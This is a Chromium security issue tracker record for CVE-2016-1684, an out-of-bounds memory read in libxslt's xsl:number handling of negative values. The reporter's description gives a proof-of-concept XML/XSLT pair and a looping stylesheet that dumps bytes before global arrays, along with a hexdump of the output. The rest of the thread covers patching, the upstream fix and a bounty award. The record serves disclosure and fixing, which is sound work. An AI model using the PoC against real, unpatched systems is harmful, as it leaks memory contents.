# Security: Memory leak in libxslt

| Field | Value |
|-------|-------|
| **Issue ID** | [40083613](https://issues.chromium.org/issues/40083613) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>XML |
| **CVE IDs** | CVE-2016-1684 |
| **Reporter** | ni...@gmail.com |
| **Assignee** | do...@chromium.org |
| **Created** | 2016-02-02 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

Negative numbers provided to [xsl:number](javascript:void(0);) allow to leak some memory content (location limited to 26 bytes on the left of some global buffers).

**VERSION**

Chrome Version: release+asan+symbolized v371829  

Operating System: Ubuntu x64

**REPRODUCTION CASE**

Live PoC at <http://nicob.net/chrome-Ezeil0hi/Bug-2/NumberFormatAlpha.xml>

# XML

<?xml-stylesheet type="text/xsl" href="NumberFormatAlpha.xsl"?>
<top/>
# XSLT

<xsl:stylesheet version="1.0" xmlns:xsl="[http://www.w3.org/1999/XSL/Transform">](http://www.w3.org/1999/XSL/Transform%22%3E)  

<xsl:template match="/">  

<xsl:number format="A" value="-22"/>  

</xsl:template>  

</xsl:stylesheet>

ADDITIONAL INFORMATION

Chrome stack-trace is attached.

The XSLT spec states in <https://www.w3.org/TR/xslt#convert> that numbers to be converted must be positive ("The following attributes are used to control conversion of a list of numbers into a string. The numbers are integers greater than 0.") but that's not verified in libxslt. Roman formats "I" and "i" are not impacted. Decimal format will convert to non-numbers, but without security implications. For example, <xsl:number format="foo" value="-8934397"/> generates the following funny face ('-,-').

Alphabetical formats "A" and "a" allow to read memory up to 26 bytes on the left of arrays "alpha\_upper\_list" (for "A") and "alpha\_lower\_list" (for "a"). On a non-ASan build, the following stylesheet read these bytes:

<xsl:stylesheet version="1.0" xmlns:xsl="[http://www.w3.org/1999/XSL/Transform">](http://www.w3.org/1999/XSL/Transform%22%3E)

<xsl:template match="/">  

<xsl:call-template name="repeatable" />  

</xsl:template>

<xsl:template name="repeatable">  

<xsl:param name="index" select="-24" />  

<xsl:param name="total" select="0" />

 <!-- Read in memory -->

<xsl:number format="A" value="$index"/>

<xsl:if test="not($index = $total)">  

<xsl:call-template name="repeatable">  

<xsl:with-param name="index" select="$index + 1" />  

</xsl:call-template>  

</xsl:if>  

</xsl:template>

</xsl:stylesheet>

$ xsltproc NumberFormatAlpha-Loop.xsl NumberFormatAlpha.xml|hd  

00000000 3c 3f 78 6d 6c 20 76 65 72 73 69 6f 6e 3d 22 31 |<?xml version="1|
00000010 2e 30 22 3f 3e 0a b7 49 18 71 b7 ff ff ff ff e0 |.0"?>..I.q......|  

00000020 f4 6e b7 30 f5 6e b7 30 09 6f b7 4d 33 71 b7 0a |.n.0.n.0.o.M3q..|

Proposed fix: verify that the numbers are positive

## Attachments

- [xsltNumberFormatAlpha-GlobalReadOverflow.txt](attachments/xsltNumberFormatAlpha-GlobalReadOverflow.txt) (text/plain, 9.7 KB)
- [fix-crbug-583171.diff](attachments/fix-crbug-583171.diff) (application/octet-stream, 2.7 KB)
- [0001-xsl-number-format-A-should-not-try-to-format-negativ.patch](attachments/0001-xsl-number-format-A-should-not-try-to-format-negativ.patch) (application/octet-stream, 3.7 KB)

## Timeline

### mm...@chromium.org (2016-02-02)

fmalita@, do you mind check this one also?

### fm...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### ni...@gmail.com (2016-02-03)

Maybe that veillard@gmail.com (libxslt author) should be cc'ed...

### cl...@chromium.org (2016-02-17)

scottmg@: Uh oh! This issue is still open and hasn't been updated in the last 14 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### mm...@google.com (2016-03-03)

[Empty comment from Monorail migration]

### do...@chromium.org (2016-03-04)

Let me take this...

### dd...@apple.com (2016-03-05)

This reproduces on upstream trunk libxslt (fc1ff481fd01e9a65a921c542fed68d8c965e8a3).


### cl...@chromium.org (2016-03-20)

dominicc@: Uh oh! This issue is still open and hasn't been updated in the last 14 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ni...@gmail.com (2016-03-20)

This bug was reported nearly 50 days ago and the fix is trivial: for every supported format (romans, alphabeticals and numeric), check that the numbers to convert are positive.

Why not adding libxslt maintainer to the thread (cf https://crbug.com/chromium/583171#c3)?

### me...@chromium.org (2016-03-21)

CC'ing veillard@gmail.com upon request from reporter.

### me...@chromium.org (2016-03-21)

+wellnhofer@aevum.de, another libxslt maintainer


### dd...@apple.com (2016-03-22)

Here's a patch that fixes the bug with a test included, although the new test doesn't run with "make check"--only "make tests".  This seems like a pre-existing bug?

I suspect Nick is working on this as I type, though.  :)


### do...@chromium.org (2016-04-02)

Brief update: WIP, just getting libxslt rolling to work reliably, here:

https://codereview.chromium.org/1848793005

Should get to this Monday.

### do...@chromium.org (2016-04-02)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-04-03)

You have far exceeded the 60-day deadline for fixing this high severity security vulnerability.

We commit ourselves to this deadline and appreciate your utmost priority on this issue.

If you are unable to look into this soon, please find someone else to own this.

- Your friendly ClusterFuzz

### do...@chromium.org (2016-04-04)

Up for review here: https://codereview.chromium.org/1853083002

### dd...@apple.com (2016-04-04)

Here's a full patch for Nick Wellnhofer that should apply to Gnome libxslt using "git am -3".


### do...@chromium.org (2016-04-05)

Thank you. I have updated the patch to pull that in instead.

### bu...@chromium.org (2016-04-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab

commit 96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab
Author: dominicc <dominicc@chromium.org>
Date: Wed Apr 06 00:16:28 2016

Roll libxslt to 891681e3e948f31732229f53cb6db7215f740fc7

BUG=583156,583171

Review URL: https://codereview.chromium.org/1853083002

Cr-Commit-Position: refs/heads/master@{#385338}

[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/COPYING
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/ChangeLog
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/HACKING
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/MAINTAINERS
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/Makefile.in
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/NEWS
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/NOTES
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/README.chromium
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/README.cvs-commits
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/aclocal.m4
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/compile
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/config.guess
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/config.sub
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/configure
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/configure.in
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/depcomp
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/install-sh
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/Makefile.in
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/crypto.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/date.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/functions.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libexslt/strings.c
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt.doap
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/Makefile.in
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/attributes.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/extensions.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/functions.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/imports.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/keys.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/libxslt.h
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/namespaces.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/numbers.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/pattern.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/preproc.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/transform.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/variables.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/win32config.h
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xslt.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltInternals.h
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltconfig.h
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltconfig.h.in
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltutils.c
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/libxslt/xsltutils.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/COPYING
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/Makefile
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/config.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/config.log
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libexslt.pc
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libexslt/Makefile
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libexslt/exsltconfig.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libxslt.pc
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libxslt.spec
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libxslt/Makefile
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/libxslt/xsltwin32config.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/linux/stamp-h1
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/ltmain.sh
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/mac/config.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/missing
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/win32/Makefile.msvc
[modify] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/win32/config.h
[add] https://crrev.com/96dbafe288dbe2f0cc45fa3c39daf6d0c37acbab/third_party/libxslt/win32/runtests.py
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/xslt-config.in
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/xsltproc/Makefile.am
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/xsltproc/testThreads.c
[delete] https://crrev.com/5d32c4d7ac9cd3e4a45a5cc1fc547103b66816c7/third_party/libxslt/xsltproc/xsltproc.c


### do...@chromium.org (2016-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-04-06)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

Your fix is very close to the branch point. After the branch happens, please make sure to check if your fix is in.

- Your friendly ClusterFuzz

### we...@aevum.de (2016-04-10)

This and a couple of other issues with xsl:number are now fixed upstream. You should also have a look at the following commit which fixes an infinite loop in xsltNumberFormatRoman:

https://git.gnome.org/browse/libxslt/commit/?id=91d0540ac9beaa86719a05b749219a69baa0dd8d


### dd...@apple.com (2016-04-11)

Thank you, Nick!


### sh...@chromium.org (2016-04-14)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-09)

This will ship with M51.

### ti...@google.com (2016-05-25)

Updating severity. This bug is currently at the reward panel.

### ti...@google.com (2016-05-25)

(copypasting most details from from https://crbug.com/chromium/583156)

Thanks for reporting this issue. Our reward panel decided to award you $1,000 for this report. Congratulations!

We've credited you in our release notes as "Nicolas Gregoire": https://googlechromereleases.blogspot.com/2016/05/stable-channel-update_25.html - if you'd like to use a different name, please let me know.

Someone from our finance team will be in contact to collect details for payment within 7 days. If that doesn't happen, please either update this bug or contact me at timwillis@.

The CVE-ID for this issue is CVE-2016-1684. Usual boilerplate text below - let me know if you have any questions.

Thanks again for the report!

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

### ti...@google.com (2016-06-08)

[Empty comment from Monorail migration]

### ti...@google.com (2016-06-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-13)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/583171?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083613)*
